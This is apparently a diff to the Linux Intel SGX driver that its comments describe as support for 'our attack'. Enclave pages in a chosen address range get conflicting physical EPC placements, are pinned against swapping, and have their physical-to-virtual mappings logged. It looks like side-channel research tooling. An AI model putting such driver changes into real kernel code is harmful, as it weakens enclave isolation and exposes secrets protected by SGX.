@@ -224,7 +224,18 @@ static bool sgx_process_add_page_req(struct sgx_add_page_req *req)
 	struct vm_area_struct *vma;
 	int ret;
 
-	epc_page = sgx_alloc_page(0);
+  /* UCB: check if the requested VA is important for our attack */
+  unsigned long addr = encl_page->addr;
+  int is_important_va = (addr >= MTAP_PIN_VA_START && addr < MTAP_PIN_VA_END);
+  if(is_important_va) {
+    epc_page = sgx_alloc_page(SGX_ALLOC_CONFLICT);
+  }
+  else {
+    epc_page = sgx_alloc_page(0);
+  }
+   
+  pr_info("epc pa %08llx -> va %08lx\n", epc_page->pa, addr);
+
 	if (IS_ERR(epc_page))
 		return false;
 
@@ -445,10 +456,14 @@ static int sgx_init_page(struct sgx_encl *encl,
 	entry->va_page = va_page;
 	entry->va_offset = va_offset;
 	entry->addr = addr;
+  
+  if(addr >= MTAP_PIN_VA_START && addr < MTAP_PIN_VA_END)
+  {
+    entry->flags |= SGX_ENCL_PAGE_PINNED;
+  }
+      
 
-     
-
-	return 0;
+  return 0;
 }
 
 static void sgx_mmu_notifier_release(struct mmu_notifier *mn,
@@ -489,11 +504,6 @@ static long sgx_ioc_enclave_create(struct file *filep, unsigned int cmd,
 	struct file *backing;
 	struct file *pcmd;
 	long ret;
-
-
-  /* UCB */
-  unsigned long addr;
-  int is_important_va;
 
 	secs = kzalloc(sizeof(*secs),  GFP_KERNEL);
 	if (!secs)
@@ -549,18 +559,7 @@ static long sgx_ioc_enclave_create(struct file *filep, unsigned int cmd,
 	encl->backing = backing;
 	encl->pcmd = pcmd;
 
-  /* UCB: check if the requested VA is important for our attack */
-  addr = encl->base + encl->size;
-  is_important_va = (addr >= MTAP_PIN_VA_START && addr < MTAP_PIN_VA_END);
-  if(is_important_va) {
-    secs_epc = sgx_alloc_page(SGX_ALLOC_CONFLICT);
-  }
-  else {
-    secs_epc = sgx_alloc_page(0);
-  }
-   
-  pr_info("epc pa %08llx -> va %08lx\n", secs_epc->pa, addr);
-
+  secs_epc = sgx_alloc_page(0);
 	if (IS_ERR(secs_epc)) {
 		ret = PTR_ERR(secs_epc);
 		secs_epc = NULL;
@@ -571,15 +570,10 @@ static long sgx_ioc_enclave_create(struct file *filep, unsigned int cmd,
 	if (ret)
 		goto out;
 
-  ret = sgx_init_page(encl, &encl->secs_page, addr);
+  ret = sgx_init_page(encl, &encl->secs_page, 
+           encl->base + encl->size);
 	if (ret)
 		goto out;
- 
-  /* UCB: pinpoint the page so that it never swapped out */ 
-  if(is_important_va)
-  {
-    encl->secs_page.flags |= SGX_ENCL_PAGE_PINNED;
-  }
 
 	secs_vaddr = sgx_get_page(secs_epc);
 
